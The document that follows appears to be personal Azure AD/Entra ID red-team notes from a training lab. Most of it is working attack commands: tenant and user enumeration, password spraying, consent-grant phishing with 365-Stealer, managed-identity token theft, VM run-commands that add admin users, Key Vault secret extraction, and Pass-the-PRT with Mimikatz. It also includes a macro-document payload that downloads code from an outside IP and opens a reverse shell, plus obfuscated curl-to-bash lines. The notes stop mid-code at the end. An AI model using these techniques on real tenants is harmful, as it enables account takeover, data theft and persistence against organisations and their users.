# Azure AD

## Recon

## Tokens

```powershell
Get-AzAccessToken -ResourceTypeName MSGraph
(Get-AzAccessToken -ResourceTypeName MSGraph).Token
# Token
Connect-AzAccount -AccountId test@defcorphq.onmicrosoft.com -AccessToken eyJ0eXA...
Connect-AzAccount -AccountId test@defcorphq.onmicrosoft.com -AccessToken eyJ0eXA... -MicrosoftGraphAccessToken eyJ0eXA...
# Az cli
az account get-access-token
az account get-access-token --resource-type ms-graph
# AAD Graph
Connect-AzureAD -AccountId test@defcorphq.onmicrosoft.com -AadAccessToken eyJ0eXA...
# MG Graph
Connect-MgGraph –AccessToken ($Token | ConvertTo-SecureString -AsPlainText -Force)
```

### Tenant

```bash
#Get if Azure tenant is in use, tenant name and Federation
https://login.microsoftonline.com/getuserrealm.srf?login=[USERNAME@DOMAIN]&xml=1
# Get the Tenant ID
https://login.microsoftonline.com/[DOMAIN]/.well-
known/openid-configuration
```

```powershell
Import-Module C:\AzAD\Tools\AADInternals\AADInternals.psd1
Get-AADIntLoginInformation -UserName admin@defcorphq.onmicrosoft.com
Get-AADIntTenantID -Domain defcorphq.onmicrosoft.com
Get-AADIntTenantDomains -Domain defcorphq.onmicrosoft.com
Invoke-AADIntReconAsOutsider -DomainName defcorphq.onmicrosoft.com
```

#### More info

```powershell
# Valid emails
C:\Python27\python.exe C:\AzAD\Tools\o365creeper\o365creeper.py -f C:\AzAD\Tools\emails.txt -o C:\AzAD\Tools\validemails.txt
# Enumerate Subdomains
. C:\AzAD\Tools\MicroBurst\Misc\Invoke-EnumerateAzureSubDomains.ps1
# You can add hr, career, etc to Misc\permutations.txt
Invoke-EnumerateAzureSubDomains -Base defcorphq -Verbose
```

#### Password Spraying

```powershell
. C:\AzAD\Tools\MSOLSpray\MSOLSpray.ps1
Invoke-MSOLSpray -UserList C:\AzAD\Tools\validemails.txt -Password 'password' -Verbose
```

### MG Module

#### Login

```powershell
$passwd = ConvertTo-SecureString "password" -AsPlainText -Force
$creds = New-Object System.Management.Automation.PSCredential ("test@defcorphq.onmicrosoft.com", $passwd)
Connect-AzAccount -Credential $creds
$Token = (Get-AzAccessToken -ResourceTypeName MSGraph).Token
Connect-MgGraph -AccessToken ($Token | ConvertTo-SecureString -AsPlainText -Force)
```

#### Enumerate

##### Users

```powershell
# Users
• Enumerate all users
Get-MgUser -All
# Enumerate a specific user
Get-MgUser -UserId test@defcorphq.onmicrosoft.com 
# Search for a user based on string in first characters of DisplayName or userPrincipalName (wildcard
not supported)
Get-MgUser -Filter "startsWith(DisplayName, 'a')" -ConsistencyLevel eventual
# Search for users who contain the word "admin" in their Display name:
Get-MgUser -All |?{$_.Displayname -match "admin"}
Get-MgUser -Search '"DisplayName:admin"' -ConsistencyLevel eventual
# List all the attributes for a user
Get-MgUser -UserId test@defcorphq.onmicrosoft.com | fl *
Get-MgUser -UserId test@defcorphq.onmicrosoft.com |
%{$_.PSObject.Properties.Name}
# Search attributes for all users that contain the string "password":
Get-MgUser -All |%{$Properties =
$_;$Properties.PSObject.Properties.Name | % {if
($Properties.$_ -match 'password')
{"$($Properties.UserPrincipalName) - $_ -
$($Properties.$_)"}}}
```
##### Groups

```powershell
# List all Groups
Get-MgGroup -All
# Enumerate a specific group
Get-MgGroup -GroupId 783a312d-0de2-4490-92e4-539b0e4ee03e
# Search for a group based on string in first characters of DisplayName (wildcard not supported)
Get-MgGroup -ConsistencyLevel eventual -Search '"DisplayName:A"'
# To search for groups which contain the word "admin" in their name:
Get-MgGroup -ConsistencyLevel eventual -Search '"DisplayName:Admin"'
# Get Groups that allow Dynamic membership
Get-MgGroup | ?{$_.GroupTypes -eq 'DynamicMembership'}
# All groups that are synced from on-prem (note that security groups are not synced)
Get-MgGroup -All| ?{$_.OnPremisesSecurityIdentifier -ne $null}
# All groups that are from Entra ID
Get-MgGroup -All | ?{$_.OnPremisesSecurityIdentifier -eq $null}
# Get members of a group
Get-MgGroupMember -GroupId 783a312d-0de2-4490-92e4-539b0e4ee03e
# Get groups and roles where the specified user is a member
(Get-MgUserMemberOf -UserId test@defcorphq.onmicrosoft.com ).AdditionalProperties
```
##### Devices

```powershell
# Get all Azure joined and registered devices
Get-MgDevice –All | fl *
# List all the active devices (and not the stale devices)
Get-MgDevice –All | ?{$_.ApproximateLastSignInDateTime -ne $null}
# List Registered owners of all the devices
$Ids = (Get-MgDevice –All).Id; foreach($i in $Ids){ (Get-MgDeviceRegisteredOwner -DeviceId $i).AdditionalProperties}
$Ids = (Get-MgDevice –All).Id; foreach($i in $Ids){ (Get-MgDeviceRegisteredOwner -DeviceId $i).AdditionalProperties.userPrincipalName}
# List Registered users of all the devices
$Ids = (Get-MgDevice –All).Id; foreach($i in $Ids){ (Get-MgDeviceRegisteredUser -DeviceId $i).AdditionalProperties}
$Ids = (Get-MgDevice –All).Id; foreach($i in $Ids){ (Get-MgDeviceRegisteredUser -DeviceId $i).AdditionalProperties.userPrincipalName}
# List devices owned by a user
(Get-MgUserOwnedDevice -userId michaelmbarron@defcorphq.onmicrosoft.com).AdditionalProperties
# List devices registered by a user
(Get-MgUserRegisteredDevice -userId michaelmbarron@defcorphq.onmicrosoft.com).AdditionalProperties
# List devices managed using Intune
Get-MgDevice -All| ?{$_.IsCompliant -eq "True"} | fl *
```
##### Roles

```powershell
# Get all available role templates
Get-MgDirectoryRoleTemplate
# Get all enabled roles (a built-in role must be enabled before usage)
Get-MgDirectoryRole
# Enumerate users to whom roles are assigned
$RoleId = (Get-MgDirectoryRole -Filter "DisplayName eq 'Global Administrator'").Id
(Get-MgDirectoryRoleMember -DirectoryRoleId $RoleId).AdditionalProperties
# Get Global Administrators
$RoleId = (Get-MgDirectoryRole -Filter "DisplayName eq 'Global Administrator'").Id
(Get-MgDirectoryRoleMember -DirectoryRoleId $RoleId).AdditionalProperties
# List Custom Directory Roles
Get-MgRoleManagementDirectoryRoleDefinition | ?{$_.IsBuiltIn -eq $False} | select DisplayName
```

##### Apps

```powershell
# Get all the application objects registered with the current tenant (visible in App Registrations in Azure portal). An application object is the global representation of an app.
Get-MgApplication -All
# Get all details about an application
Get-MgApplicationByAppId -AppId f072c4a6-b440-40de-983f-a7f3bd317d8f | fl *
# Get an application based on the display name
Get-MgApplication -All | ?{$_.DisplayName -match "app"}
#The Get-MgApplication will show all the applications details including password but password value is not shown. List all the apps with an application password
Get-MgApplication -All| ?{$_.PasswordCredentials -ne $null}
# Get owner of an application
(Get-MgApplicationOwner -ApplicationId 35589758-714e-43a9-be9e-94d22fdd34f6).AdditionalProperties.userPrincipalName
# Get Apps where a User has a role (exact role is not shown)
Get-MgUserAppRoleAssignment -UserId roygcain@defcorphq.onmicrosoft.com | fl *
# Get Apps where a Group has a role (exact role is not shown)
Get-MgGroupAppRoleAssignment -GroupId 57ada729-a581-4d6f-9f16-3fe0961ada82 | fl *
```

###### Service Principals

```powershell
#Enumerate Service Principals (visible as Enterprise Applications in Azure Portal). Service principal is local representation for an app in a specific tenant and it is the security object that has privileges. This is the 'service account'!
# Service Principals can be assigned Azure roles.
# Get all service principals
Get-MgServicePrincipal -All
# Get all details about a service principal
Get-MgServicePrincipal -ServicePrincipalId fd518680-b290-4db2-b92a-5dbd025c6791 | fl *
# Get an service principal based on the display name
Get-MgServicePrincipal –All | ?{$_.DisplayName -match "app"}
# List all the service principals with an application password
Get-MgServicePrincipal –All | ?{$_.KeyCredentials -ne $null}
# Get owner of a service principal
(Get-MgServicePrincipalOwner -ServicePrincipalId fd518680-b290-4db2-b92a-5dbd025c6791).AdditionalProperties.userPrincipalName
# Get objects owned by a service principal
Get-MgServicePrincipalOwnedObject -ServicePrincipalId fd518680-b290-4db2-b92a-5dbd025c6791
# Get objects created by a service principal
Get-MgServicePrincipalCreatedObject -ServicePrincipalId fd518680-b290-4db2-b92a-5dbd025c6791
# Get group and role memberships of a service principal
Get-MgServicePrincipalMemberOf -ServicePrincipalId fd518680-b290-4db2-b92a-5dbd025c6791 | fl *
```

### Az Powershell

#### Login

```powershell
$passwd = ConvertTo-SecureString "password" -AsPlainText -Force
$creds = New-Object System.Management.Automation.PSCredential ("test@defcorphq.onmicrosoft.com", $passwd)
Connect-AzAccount -Credential $creds
```

#### Recon

```powershell
#Get the information about the current context (Account, Tenant, Subscription etc.)
Get-AzContext
# List all available contexts
Get-AzContext -ListAvailable
# Enumerate subscriptions accessible by the current user
Get-AzSubscription
# Enumerate all resources visible to the current user
Get-AzResource
# Enumerate all Azure RBAC role assignments
Get-AzRoleAssignment
```

#### Enumerate

##### Users

```powershell
#Enumerate all users
Get-AzADUser
# Enumerate a specific user
Get-AzADUser -UserPrincipalName test@defcorphq.onmicrosoft.com
# Search for a user based on string in first characters of DisplayName (wildcardnot supported)
Get-AzADUser -SearchString "admin"
# Search for users who contain the word "admin" in their Display name:
Get-AzADUser |?{$_.Displayname -match "admin"}
```

##### Groups

```powershell
#List all groups
Get-AzADGroup
# Enumerate a specific group
Get-AzADGroup -ObjectId 783a312d-0de2-4490-92e4-539b0e4ee03e
# Search for a group based on string in first characters of DisplayName #(wildcard not supported)
Get-AzADGroup -SearchString "admin" | fl *
# To search for groups which contain the word "admin" in their name:
Get-AzADGroup |?{$_.Displayname -match "admin"}
# Get members of a group
Get-AzADGroupMember -ObjectId 783a312d-0de2-4490-92e4-539b0e4ee03e
```

##### Apps

```powershell
# Get all the application objects registered with the current tenant (visible in App Registrations in Azure portal). An application object is the global representation of an app.
Get-AzADApplication
# Get all details about an application
Get-AzADApplication -ObjectId a1333e88-1278-41bf-8145-155a069ebed0
# Get an application based on the display name
Get-AzADApplication | ?{$_.DisplayName -match "app"}
# The Get-AzADAppCredential will show the applications with an application password but password value is not shown. List all the apps with an application password
Get-AzADApplication | %{if(Get-AzADAppCredential -ObjectID $_.ID){$_}}
```

##### Service Principals

```powershell
#Enumerate Service Principals (visible as Enterprise Applications in Azure Portal). Service principal is local representation for an app in a specific tenant and it is the security object that has privileges. This is the 'service account'!
# Service Principals can be assigned Azure roles.
# Get all service principals
Get-AzADServicePrincipal
# Get all details about a service principal
Get-AzADServicePrincipal -ObjectId cdddd16e-2611-4442-8f45-053e7c37a264
# Get a service principal based on the display name
Get-AzADServicePrincipal | ?{$_.DisplayName -match "app"}
```

##### Web Apps

```powershell
Get-AzWebApp | ?{$_.Kind -notmatch "functionapp"}
```

### az cli

#### Recon

```bash
# Login
az login -u test@defcorphq.onmicrosoft.com -p password
# List vms
az vm list 
az vm list --query "[].[name]" -o table
# List webapps
az webapp list
az webapp list --query "[].[name]" -o table
# List functiona pps
az functionapp list --query "[].[name]" -o table
# List storage
az storage account list
# List key vault
az keyvault list
# Get details of the current tenant (uses the account extension)
az account tenant list
# Get details of the current subscription (uses the account extension)
az account subscription list
# List the current signed-in user
az ad signed-in-user show
```

#### Enumerate

##### Users

```bash
Enumerate all users
az ad user list
az ad user list --query "[].[displayName]" -o table
# Enumerate a specific user (lists all attributes)
az ad user show --id test@defcorphq.onmicrosoft.com
# Search for users who contain the word "admin" in their Display name (case sensitive):
az ad user list --query "[?contains(displayName,'admin')].displayName"
# When using PowerShell, search for users who contain the word "admin" in their Display name. This is NOT case-sensitive:
az ad user list | ConvertFrom-Json | %{$_.displayName -match "admin"}
#All users who are synced from on-prem
az ad user list --query "[?onPremisesSecurityIdentifier!=null].displayName"
# All users who are from Entra ID
az ad user list --query "[?onPremisesSecurityIdentifier==null].displayName"
```

##### Groups

```bash
#List all Groups
az ad group list
az ad group list --query "[].[displayName]" -o table
# Enumerate a specific group using display name or object id
az ad group show -g "VM Admins"
az ad group show -g 783a312d-0de2-4490-92e4-539b0e4ee03e
# Search for groups that contain the word "admin" in their Display name (case sensitive) - run from cmd:
az ad group list --query "[?contains(displayName,'admin')].displayName"
# When using PowerShell, search for groups that contain the word "admin" in their Display name. This is NOT case-sensitive:
az ad group list | ConvertFrom-Json | %{$_.displayName -match "admin"}
# All groups that are synced from on-prem
az ad group list --query "[?onPremisesSecurityIdentifier!=null].displayName"
# All groups that are from Entra ID
az ad group list --query "[?onPremisesSecurityIdentifier==null].displayName"
# Get members of a group
az ad group member list -g "VM Admins" --query "[].[displayName]" -o table
# Check if a user is member of the specified group
az ad group member check --group "VM Admins" --member-id b71d21f6-8e09-4a9d-932a-cb73df519787
# Get the object IDs of the groups of which the specified group is a member
az ad group get-member-groups -g "VM Admins"
```

##### Apps

```bash
#Get all the application objects registered with the current tenant (visible in App Registrations in Azure portal). An application object is the global representation of an app.
az ad app list
az ad app list --query "[].[displayName]" -o table
# Get all details about an application using identifier uri, application id or object id
az ad app show --id a1333e88-1278-41bf-8145-155a069ebed0
# Get an application based on the display name (Run from cmd)
az ad app list --query "[?contains(displayName,'app')].displayName"
# When using PowerShell, search for apps that contain the word "slack" in their Display name. This is NOT case-sensitive:
az ad app list | ConvertFrom-Json | %{$_.displayName -match "app"}
# Get owner of an application
az ad app owner list --id a1333e88-1278-41bf-8145-155a069ebed0 --query "[].[displayName]" -o table
# List apps that have password credentials
az ad app list --query "[?passwordCredentials !=null].displayName"
# List apps that have key credentials (use of certificate authentication)
az ad app list --query "[?keyCredentials !=null].displayName"
```

##### Service Principals

```bash
#Enumerate Service Principals (visible as Enterprise Applications in Azure Portal). Service principal is local representation for an app in a specific tenant and it is the security object that has privileges. This is the 'service account'!
# Service Principals can be assigned Azure roles.
# Get all service principals
az ad sp list --all
az ad sp list --all --query "[].[displayName]" -o table
# Get all details about a service principal using service principal id or object id
az ad sp show --id cdddd16e-2611-4442-8f45-053e7c37a264
# Get a service principal based on the display name
az ad sp list --all --query "[?contains(displayName,'app')].displayName"
# When using PowerShell, search for service principals that contain the word "slack" in their Display name. This is NOT case-sensitive:
az ad sp list --all | ConvertFrom-Json | %{$_.displayName -match "app"}
# Get owner of a service principal
az ad sp owner list --id cdddd16e-2611-4442-8f45-053e7c37a264 --query "[].[displayName]" -o table
# Get service principals owned by the current user
az ad sp list --show-mine
# List apps that have password credentials
az ad sp list --all --query "[?passwordCredentials != null].displayName"
# List apps that have key credentials (use of certificate authentication)
az ad sp list -all --query "[?keyCredentials != null].displayName"
```

### StormSPotter

- https://github.com/Azure/Stormspotter

```bash
az login -u test@defcorphq.onmicrosoft.com -p password
python sscollector.pyz cli
```

### Bloodhound

- https://github.com/SpecterOps/BloodHound
- https://github.com/SpecterOps/AzureHound

#### Windows

##### Option 1

```powershell
Import-Module C:\AzAD\Tools\AzureAD\AzureAD.psd1
$passwd = ConvertTo-SecureString "password" -AsPlainText -Force
$creds = New-Object System.Management.Automation.PSCredential ("test@defcorphq.onmicrosoft.com", $passwd)
Connect-AzAccount -Credential $creds
. C:\AzAD\Tools\AzureHound\AzureHound.ps1
Invoke-AzureHound -Verbose
```

##### Option 2

```powershell
# request device code
$body = @{
    "client_id" =     "1950a258-227b-4e31-a9cf-717495945fc2"
    "resource" =      "https://graph.microsoft.com"
}
$UserAgent = "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/103.0.0.0 Safari/537.36"
$Headers=@{}
$Headers["User-Agent"] = $UserAgent
$authResponse = Invoke-RestMethod `
    -UseBasicParsing `
    -Method Post `
    -Uri "https://login.microsoftonline.com/common/oauth2/devicecode?api-version=1.0" `
    -Headers $Headers `
    -Body $body
$authResponse
# Authenticate with device code and use the token
$body=@{
    "client_id" =  "1950a258-227b-4e31-a9cf-717495945fc2"
    "grant_type" = "urn:ietf:params:oauth:grant-type:device_code"
    "code" =       $authResponse.device_code
}
$Tokens = Invoke-RestMethod `
    -UseBasicParsing `
    -Method Post `
    -Uri "https://login.microsoftonline.com/Common/oauth2/token?api-version=1.0" `
    -Headers $Headers `
    -Body $body
$Tokens
write-output $Tokens.refresh_token
# Refresh token
./azurehound -r $Tokens.refresh_token list --tenant "contoso.onmicrosoft.com" -o output.json
# Access TOken
./azurehound -r $Tokens.access_token list --tenant "contoso.onmicrosoft.com" -o output.json
```

#### Linux

```bash
./azurehound -u user@mail.com -p 'pass' -t <tenant id> -o output.json
```


## Exploitation

### Illicit Consent Grant Attack

- https://www.alteredsecurity.com/post/introduction-to-365-stealer
- https://github.com/trouble-1/vajra

We need:

1. External Tenant
2. In cases (Admin consent)

Steps:

1. Create an application `(Multitenant, web, Redirect to our ip server - https://ip/login/authorized)`
2. Copy the Application (client) ID
3. Generate secret and save value
4. Go to API Permissions and add Delegated Permissions MS Graph (read,files,etc)
5. Launch 365 steeler and set config
6. Send phishing link to victim
7. If you have read,write permissions to Onedrive you can upload a reverse shell into word document

```powershell
# RCE Macro doc
Out-Word -Payload "powershell iex (New-Object Net.Webclient).downloadstring('http://172.16.150.x:82/Invoke-PowerShellTcp.ps1');Power -Reverse -IPAddress 172.16.150.x -Port 4444" -OutputFile studentx.doc
C:\AzAD\Tools\netcat-win32-1.12\nc.exe -lvp 4444
```

```bash
# Also you can set on webapp
python 365-Stealer.py --set-config
python 365-Stealer.py --run-app
```

### Azure App Service

> We need rce to access to management identity with the header and request a token

Could be these vulnerabilities:

1. File Upload Vulnerability
2. SSTI
3. RCE

```bash
# For Linux
# Graph
echo 'Y3VybCAiJElERU5USVRZX0VORFBPSU5UP3Jlc291cmNlPWh0dHBzOi8vZ3JhcGgubWljcm9zb2Z0LmNvbS8mYXBpLXZlcnNpb249MjAxNy0wOS0wMSIgLUggc2VjcmV0OiRJREVOVElUWV9IRUFERVI=' | base64 -d | bash
# Management Azure
echo 'Y3VybCAiJElERU5USVRZX0VORFBPSU5UP3Jlc291cmNlPWh0dHBzOi8vbWFuYWdlbWVudC5henVyZS5jb20vJmFwaS12ZXJzaW9uPTIwMTctMDktMDEiIC1IIHNlY3JldDokSURFTlRJVFlfSEVBREVS' | base64 -d | bash
```

#### Management Azure

```powershell
env
# Get Token Azure
curl "$IDENTITY_ENDPOINT?resource=https://management.azure.com/&api-version=2017-09-01" -H secret:$IDENTITY_HEADER
curl "$IDENTITY_ENDPOINT?resource=https://graph.microsoft.com/&api-version=2017-09-01" -H secret:$IDENTITY_HEADER
curl "$IDENTITY_ENDPOINT?resource=https://vault.azure.net&api-version=2017-09-01" -H secret:$IDENTITY_HEADER
```

```powershell
$TokenManagement =  'eyJ0eX..'
$URI = 'https://management.azure.com/subscriptions?api-version=2020-01-01'

$RequestParams = @{
    Method  = 'GET'
    Uri     = $URI
    Headers = @{
        'Authorization' = "Bearer $TokenManagement" 
    }
}
(Invoke-RestMethod @RequestParams).value
# Change URI to /resources after obtain subscription
# Example: https://management.azure.com/subscriptions/b413826f-108d-4049-8c11-d52d5d388768/resources?api-version=2020-10-01
# After /providers/Microsoft.Authorization/permissions 
# Example: https://management.azure.com/subscriptions/b413826f-108d-4049-8c11-d52d5d388768/resourceGroups/Engineering/providers/Microsoft.Compute/virtualMachines/bkpadconnect/providers/Microsoft.Authorization/permissions?api-version=2015-07-01
```

### VM

#### Add user code

```powershell
$passwd = ConvertTo-SecureString "passs" -AsPlainText -Force
New-LocalUser -Name studentX -Password $passwd 
Add-LocalGroupMember -Group Administrators -Member studentx
```

#### Check permissions

```powershell
Get-AzResource
Get-AzRoleAssignment -Scope /subscriptions/b413826f-108d-4049-8c11-d52d5d388768/resourceGroups/RESEARCH/providers/Microsoft.Compute/virtualMachines/jumpvm
Get-AzRoleDefinition -Name "Virtual Machine Command Executor"
Get-AzADGroup -DisplayName 'VM Admins'
```

```powershell
Get-AzResourceGroup
Get-AzResourceGroupDeployment -ResourceGroupName SAP
Save-AzResourceGroupDeploymentTemplate -ResourceGroupName SAP -DeploymentName stevencking_defcorphq.onmicrosoft.com.sapsrv

```

#### Info usres

```powershell
(Get-AzAccessToken -ResourceUrl https://graph.microsoft.com).Token
$Token =  'eyJ0..'
$URI = 'https://graph.microsoft.com/v1.0/users/VMContributor99@defcorphq.onmicrosoft.com/memberOf'
$RequestParams = @{
     Method  = 'GET'
     Uri     = $URI
     Headers = @{
         'Authorization' = "Bearer $Token"
     }
}
(Invoke-RestMethod @RequestParams).value
# Get info about unit id
Get-MgDirectoryAdministrativeUnit -AdministrativeUnitId e1e26d93-163e-42a2-a46e-1b7d52626395
# Get members of aministrative unit
Get-MgDirectoryAdministrativeUnitMember -AdministrativeUnitId e1e26d93-163e-42a2-a46e-1b7d52626395 | fl *
# Get members of administrative unit
Get-MgDirectoryAdministrativeUnitScopedRoleMember -AdministrativeUnitId e1e26d93-163e-42a2-a46e-1b7d52626395 | fl *
# Get member of administrative unit
(Get-MgDirectoryAdministrativeUnitScopedRoleMember -AdministrativeUnitId e1e26d93-163e-42a2-a46e-1b7d52626395).RoleMemberInfo
# Get ROle of user
Get-MgDirectoryRole -DirectoryRoleId 5b3935ed-b52d-4080-8b05-3a1832194d3a
# Get info about user
Get-MgUser -UserId 8c088359-66fb-4253-ad0d-a91b82fd548a | fl *
```

#### Run Command

```powershell
Invoke-AzVMRunCommand `
    -ResourceGroupName "Engineering" `
    -VMName "bkpadconnect" `
    -CommandId "RunPowerShellScript" `
    -ScriptString "whoami"
# or script
Invoke-AzVMRunCommand -VMName bkpadconnect -ResourceGroupName Engineering -CommandId 'RunPowerShellScript' -ScriptPath 'C:\AzAD\Tools\adduser.ps1' -Verbose
# Access
$password = ConvertTo-SecureString 'pass' -AsPlainText -Force
$creds = New-Object System.Management.Automation.PSCredential('user', $Password)
$sess = New-PSSession -ComputerName <IP> -Credential $creds -SessionOption (New-PSSessionOption -ProxyAccessType NoProxyServer)
Enter-PSSession $sess
```

#### Extract IP

```powershell
Get-AzVM -Name bkpadconnect -ResourceGroupName Engineering | select -ExpandProperty NetworkProfile #Networkinterface
Get-AzNetworkInterface -Name bkpadconnect368 #IPCONFIGURSATION
Get-AzPublicIpAddress -Name bkpadconnectIP
```

#### Connnect Session

```powershell
$password = ConvertTo-SecureString 'pass' -AsPlainText -Force
$creds = New-Object System.Management.Automation.PSCredential('user', $Password)
$sess = New-PSSession -ComputerName <ip> -Credential $creds -SessionOption (New-PSSessionOption -ProxyAccessType NoProxyServer)
Enter-PSSession $sess
```

#### Extract Secrets

```powershell
$userData = Invoke-RestMethod -Headers @{"Metadata"="true"} -Method GET -Uri "http://169.254.169.254/metadata/instance/compute/userData?api-version=2021-01-01&format=text"
[System.Text.Encoding]::UTF8.GetString([Convert]::FromBase64String($userData))
Get-AzResource
```

##### Check permissions

```powershell
$Token = (Get-AzAccessToken).Token
$URI = 'https://management.azure.com/subscriptions/b413826f-108d-4049-8c11-d52d5d388768/resourceGroups/Research/providers/Microsoft.Compute/virtualMachines/infradminsrv/providers/Microsoft.Authorization/permissions?api-version=2015-07-01'

$RequestParams = @{
    Method  = 'GET'
    Uri     = $URI
    Headers = @{
        'Authorization' = "Bearer $Token" 
    }
}
(Invoke-RestMethod @RequestParams).value
# Check extensions
Get-AzVMExtension -ResourceGroupName "Research" -VMName "infradminsrv"
# Execute extension
Set-AzVMExtension -ResourceGroupName "Research" -ExtensionName "ExecCmd" -VMName "infradminsrv" -Location "Germany West Central" -Publisher Microsoft.Compute -ExtensionType CustomScriptExtension -TypeHandlerVersion 1.8 -SettingString '{"commandToExecute":"powershell net users student99 Stud99Password@123 /add /Y; net localgroup administrators student99 /add"}'
```

#### Graph

```powershell
env
# Get Token Graph
curl "$IDENTITY_ENDPOINT?resource=https://graph.microsoft.com/&api-version=2017-09-01" -H secret:$IDENTITY_HEADER
```

List enterprise Applications

```powershell
$Token =  'eyJ0eX..'
$URI = ' https://graph.microsoft.com/v1.0/applications'

$RequestParams = @{
    Method  = 'GET'
    Uri     = $URI
    Headers = @{
        'Authorization' = "Bearer $Token" 
    }
}
(Invoke-RestMethod @RequestParams).value
# or
(Invoke-RestMethod @RequestParams).value | select displayName
```

##### Abuse Enterprise Applications

```powershell
. C:\AzAD\Tools\Add-AzADAppSecret.ps1
Add-AzADAppSecret -GraphToken $TokenGraph -Verbose
```

### Storage

```powershell
# Recon
. C:\AzAD\Tools\MicroBurst\Misc\Invoke-EnumerateAzureBlobs.ps1
# List possible blobs. Example: https://defcorpcommon.blob.core.windows.net/backup?restype=container&comp=list
Invoke-EnumerateAzureBlobs -Base <name>
```

```powershell
# List storage accounts
Get-AzStorageAccount | fl 
# GEt Storage content
Get-AzResource
Get-AzStorageContainer -Context (New-AzStorageContext -StorageAccountName defcorpcodebackup)
```

### SAS

> If you have a SAS URL you can use `Microsoft Azure Storage Explorer`

```
https://<storage_account>.blob.core.windows.net/<container_name>/<blob_name>?sv=2024-01-01&se=2024-12-31T23%3A59%3A59Z&sr=b&sp=rwdlacup&sig=abcdef1234567890abcdef1234567890abcdef1234567890abcdef1234567890
```

With the token you can enumerate the permissions but by default Azure not show that 


### Automation Accounts

#### Using token

```powershell
az ad signed-in-user show 
az extension add --upgrade -n automation
az ad signed-in-user list-owned-objects 
# "displayName": "Automation Admins"
# Get token
az account get-access-token --resource-type ms-graph
$token = 'ey..'
Connect-MgGraph -AccessToken ($Token | ConvertTo-SecureString -AsPlainText -Force)
```

Add user with the object id to the group to the groupo ID 

```powershell
$params = @{
     "@odata.id" = "https://graph.microsoft.com/v1.0/directoryObjects/<object id>"
}
New-MgGroupMemberByRef -GroupId <object ID> -BodyParameter $params
# or
New-MgGroupMember -GroupId <group object id> -DirectoryObjectId <user object id>
```

#### Exploiting

Using the user with the permissions "Automation Admins"

```bash
az account get-access-token
az account get-access-token --resource-type aad-graph
$AADToken = 'eyJ0…'
$AccessToken = 'eyJ0…'
Connect-AzAccount -AccessToken $AccessToken -GraphAccessToken $AADToken -AccountId <user object ID>
# Check permissions. Also you can check with bloodhound CE
Get-AzRoleAssignment -Scope /subscriptions/b413826f-108d-4049-8c11-d52d5d388768/resourceGroups/Engineering/providers/Microsoft.Automation/automationAccounts/HybridAutomation
Get-AzAutomationHybridWorkerGroup -AutomationAccountName HybridAutomation -ResourceGroupName Engineering
Import-AzAutomationRunbook -Name student99 -Path C:\AzAD\Tools\student99.ps1 -AutomationAccountName HybridAutomation -ResourceGroupName Engineering -Type PowerShell -Force -Verbose
Publish-AzAutomationRunbook -RunbookName student99 -AutomationAccountName HybridAutomation -ResourceGroupName Engineering -Verbose
Start-AzAutomationRunbook -RunbookName student99 -RunOn Workergroup1 -AutomationAccountName HybridAutomation -ResourceGroupName Engineering -Verbose
```

### Key Vaults

If you have a token with permissiont to key vault

#### Login

```bash
curl "$IDENTITY_ENDPOINT?resource=https://vault.azure.net&api-version=2017-09-01" -H secret:$IDENTITY_HEADER
curl "$IDENTITY_ENDPOINT?resource=https://management.azure.com&api-version=2017-09-01" -H secret:$IDENTITY_HEADER
```

```powershell
Connect-AzAccount -AccessToken $token -AccountId 2e91a4fe-a0f2-46ee-8214-fa2ff6aa9abc -KeyVaultAccessToken $keyvaulttoken
```

#### Extract

```powershell
Get-AzKeyVault
Get-AzKeyVault -VaultName ResearchKeyVault
Get-AzKeyVaultSecret -VaultName ResearchKeyVault -Name Reader –AsPlainText
```

### Enterrpise Applications

```powershell
Get-MgServicePrincipal -All | ?{$_.AppId -eq "62e44426-5c46-4e3c-8a89-f461d5d586f2"} | fl #Application client id 
```

#### Secrets

```powershell
$password = ConvertTo-SecureString '_1ATfh--GD.WBhRuP.H3p_iR~MX2W1OA6S' -AsPlainText -Force
$creds = New-Object System.Management.Automation.PSCredential('f072c4a6-b440-40de-983f-a7f3bd317d8f', $password)
Connect-AzAccount -ServicePrincipal -Credential $creds -Tenant 2d50cb29-5f7b-48a4-87ce-fe75a941adb6
```

### Pass the PRT Attack

```powershell
$TenantId = "2d50cb29-5f7b-48a4-87ce-fe75a941adb6"

$URL = "https://login.microsoftonline.com/$TenantId/oauth2/token"

$Params = @{
    "URI"     = $URL 
    "Method"  = "POST"
}

$Body = @{
    "grant_type" = "srv_challenge"
    }


$Result = Invoke-RestMethod @Params -UseBasicParsing -Body $Body
$Result.Nonce
```

```powershell
Invoke-Command -Session $infradminsrv -ScriptBlock{C:\Users\Public\student99\PsExec64.exe -accepteula -s "cmd.exe" " /c C:\Users\Public\student99\SessionExecCommand.exe MichaelMBarron C:\Users\Public\student99\ROADToken.exe <codeNONCE> > C:\Users\Public\student99\PRT.txt"}
# or 
C:\Users\Public\student99\SessionExecCommand.exe MichaelMBarron C:\Users\Public\student99\ROADToken.exe <codeNONCE> > C:\Users\Public\student99\PRT.txt
```

#### Mimikatz

```powershell
Invoke-Command -Session $infradminsrv -ScriptBlock{C:\Users\Public\student1\mimikatz.exe sekurlsa::cloudap exit}
# Decrypt using PRT and keyvalue
Invoke-Command -Session $infradminsrv -ScriptBlock{C:\Users\Public\student1\mimikatz.exe "token::elevate" "dpapi::cloudapkd /keyvalue:<keyvalue> /unprotect" "exit"}
# Using prt and key decoded 
roadtx prt -a renew --prt <prt> --prt-sessionkey <clear key>
# Authenticate
roadtx browserprtauth -url https://portal.azure.com
# or roadtx prtauth -c azps -r azrm --tokens-stdout
```

Steps:

> Remember to use the nonce code just one time

1. Enter to https://login.microsoftonline.com/login.srf 
2. Clear all cookies
3. Add cookie 'x-ms-RefreshTokenCredential' with the value and enable HTTPOnly
4. Click url and enter


### Intune Administrator

If you have Intune Administrator you can execute commandos on the workstations

1. Access to https://endpoint.microsoft.com/#home 
2. Go to Devices
3. Go to Scripts and Remediations
4. Go to Platform Scripts and add your script.ps1
5.  Script settings (Using logged on Credentials: No, Enfoce Script: No, 64 bit Powershell: Yes)
6. Assignments: Add All Users and All Devices

### Dynamic Groups

```powershell
Get-MgGroup -Filter "groupTypes/any(c:c eq 'DynamicMembership')" -Property Id, DisplayName, MembershipRule
$dynamicGroup | Select-Object DisplayName, Id, @{Name='DynamicRule';Expression={$_.MembershipRule}}
```


```python
import http.client
import json

# Definición de variables
client_id = '04b07795-8ddb-461a-bbee-02f9e1bf7b46'
